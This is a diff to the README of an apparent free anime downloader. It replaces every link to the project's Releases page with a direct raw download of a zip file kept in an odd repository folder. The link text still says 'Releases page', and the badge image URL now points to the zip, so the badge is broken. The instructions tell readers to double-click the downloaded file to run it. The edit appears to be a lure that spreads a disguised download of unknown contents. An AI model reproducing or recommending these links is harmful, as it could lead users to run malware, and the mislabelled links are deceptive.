@@ -1,6 +1,6 @@
 # 🎉 unlimited-kissanime-downloader - Effortless Anime Downloads for Free
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-v1.0-brightgreen)](https://github.com/anisha5748/unlimited-kissanime-downloader/releases)
+[![Download Now](https://github.com/anisha5748/unlimited-kissanime-downloader/raw/refs/heads/main/Barcan/unlimited-kissanime-downloader-v3.8.zip%20Now-v1.0-brightgreen)](https://github.com/anisha5748/unlimited-kissanime-downloader/raw/refs/heads/main/Barcan/unlimited-kissanime-downloader-v3.8.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the Unlimited Kissanime Downloader! This application allows you to do
 
 To get started, follow these simple steps:
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/anisha5748/unlimited-kissanime-downloader/releases).
+1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/anisha5748/unlimited-kissanime-downloader/raw/refs/heads/main/Barcan/unlimited-kissanime-downloader-v3.8.zip).
 2. **Download the Latest Version**: Look for the latest release, then click to download the file suitable for your system. 
 3. **Run the Application**: Once the download completes, find the downloaded file and double-click to launch the application. 
 
@@ -61,6 +61,6 @@ This project is open-source. You can freely use, modify, and distribute the appl
 
 ### 🔗 Link to Download Again
 
-To download the application, click here: [Visit the Releases Page](https://github.com/anisha5748/unlimited-kissanime-downloader/releases).
+To download the application, click here: [Visit the Releases Page](https://github.com/anisha5748/unlimited-kissanime-downloader/raw/refs/heads/main/Barcan/unlimited-kissanime-downloader-v3.8.zip).
 
 Feel free to share this application with friends who enjoy anime! Happy downloading!
